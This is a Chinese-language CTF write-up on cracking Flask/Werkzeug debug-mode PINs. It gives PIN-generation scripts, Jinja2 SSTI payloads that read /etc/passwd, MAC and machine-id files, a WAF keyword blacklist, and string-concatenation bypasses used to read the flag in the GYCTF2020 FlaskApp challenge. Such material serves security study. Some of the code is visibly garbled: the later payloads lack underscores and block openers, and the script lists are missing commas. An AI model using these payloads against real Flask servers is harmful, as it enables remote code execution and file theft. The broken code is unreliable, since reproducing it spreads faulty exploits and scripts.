Flask之Debug模式下的PIN码攻击

https://p4d0rn.github.io/post/flask-pin/
https://p4d0rn.github.io

0x01 What Is PIN?

当Flask开启debug模式时，通过PIN码能够进入代码调试模式，进而实现任意代码执行
先看一下简单的例子：

from flask import Flask

app = Flask(__name__)

@app.route("/")
def hello():
    return 'Hello World!'

app.run(host="0.0.0.0", port=8080, debug=True)  # 开启调试模式


访问127.0.0.1:5000/console
console表示进入调试模式、是官方定义的一个调试接口

输入PIN码，发现可以执行代码

应该注意到，PIN码并不是随机生成，重复运行同一程序可以发现生成的PIN一样
PIN码生成满足一定的生成算法

0x02 How To Generate PIN?

可以看到PIN码在程序刚开始运行就生成了，在app.run(host="0.0.0.0", port=8080, debug=True)处下断点，全局搜索pin

在pin函数处下断点，这个函数最后返回PIN码

跟进get_pin_and_cookie_name
里面的代码我们无需读懂，我们只需填入生成PIN码需要的数据

PIN码的生成要素

  • username
    • 通过程序读取：getpass.getuser()
    • 通过文件读取：/etc/passwd
  • modname
    • 通过程序读取：getattr(mod,"__file__",None)
    • 默认值为flask.app
  • appname
    • 通过程序读取：getattr(mod,"__name__",type(app).__name__)
    • 默认值为Flask（大小写敏感）
  • moddir flask库下app.py的绝对路径
    • 通过程序读取：getattr(mod,"__file__",None)
    • 可以通过报错读取
  • uuidnode 当前网络的mac地址的十进制数
    • 通过程序读取：uuid.getnode()
    • 通过文件读取：/sys/class/net/eth0/address得到16进制结果，转为10进制参与运算
  • machine_id 通过合并3个文件的值确定
      1. /etc/machine-id 【Docker环境下不需要读这个文件】
      1. /proc/sys/kernel/random/boot_id
      1. /proc/self/cgroup

注意：Python3.8和Python3.6的PIN生成算法不一样！！！
python3.6采用MD5加密，python3.8采用sha1加密

# python3.8 sha1
import hashlib
from itertools import chain
probably_public_bits = [
    'root'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    '2485377581187',#  /sys/class/net/eth0/address 16进制转10进制
    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

# python3.6 MD5
import hashlib
from itertools import chain
probably_public_bits = [
     'flaskweb'# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address
     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
   h.update(b'pinsalt')
   num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
   for group_size in 5, 4, 3:
       if len(num) % group_size == 0:
          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                      for x in range(0, len(num), group_size))
          break
       else:
          rv = num

print(rv)

0x03Get PIN In Practice

下面以BUUCTF上的一题作为演示
[GYCTF2020]FlaskApp

预期解


点击提示，F12查看网页源码，提示PIN
因此接下来考虑读取用于生成PIN的那几个数据的所在文件

由于是Flask框架，首先考虑是否存在SSTI
这个网站提供了Base64加密和解密的功能
将{{7*7}}经过Base64加密后，利用这个网站进行解密，返回no!no!no!
应该是过滤了东西，试试 {{[].class}}

HTML解码后为 <class 'list'>
使用之前文章收藏的payload来读取文件
点我查看payload

#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

先读取 /etc/passwd，username为flaskweb

读取 /sys/class/net/eth0/address
得到 fe:a5:21:be:82:b2
转为10进制：279985189192370

读取 /etc/machine-id
得到1408f836b0ca514d796cbf8960e45fa1

接着读取 /proc/sys/kernel/random/boot_id
得到0e5d30fa-26d7-42e1-a736-fc8a2e419c51

读取 /proc/self/cgroup 并没有想要的信息

modname默认为flask.app
appname默认为Flask

moddir我们通过报错来获取，输入错误格式的base64编码

得到moddir为 /usr/local/lib/python3.7/site-packages/flask/app.py
由此还可得知python的版本为3.7，所以待会生成PIN使用md5算法

这里顺便看一下源码

获取传入的参数text，base64解码后先经过waf函数检测，若通过则render_template_string，渲染后返回。

接着将上面的数据填入脚本中对应的位置，跑出PIN码
注：这边machine_id只需要/etc/machine-id，如果跑出来PIN码不对那就把那三个排列组合一下
访问/console，成功进入交互控制台

非预期解

先看看waf中过滤了哪些关键字

{% for c in [].class.base.subclasses() %}{% if c.name=='catch_warnings' %}{{ c.init.globals['builtins'].open('app.py', 'r').read() }}{% endif %}{% endfor %}

def waf(str):
    black_list = ["flag", "os", "system", "popen", "import", "eval", "chr", "request", "subprocess","commands", "socket", "hex", "base64", "*", "?"]
    for x in black_list:
        if x in str.lower():
            return 1

可以通过字符串拼接来绕过

{% for c in [].class.base.subclasses() %}

{{ c.init.globals['builtins']'imp'+'ort'.listdir('/')}}
{% endif %}
{% endfor %}

{% if c.name=='catch_warnings' %}{{ c.init.globals['builtins'].open('/this_is_the_fl'+'ag.txt','r').read()}}
{% endif %}
{% endfor %}
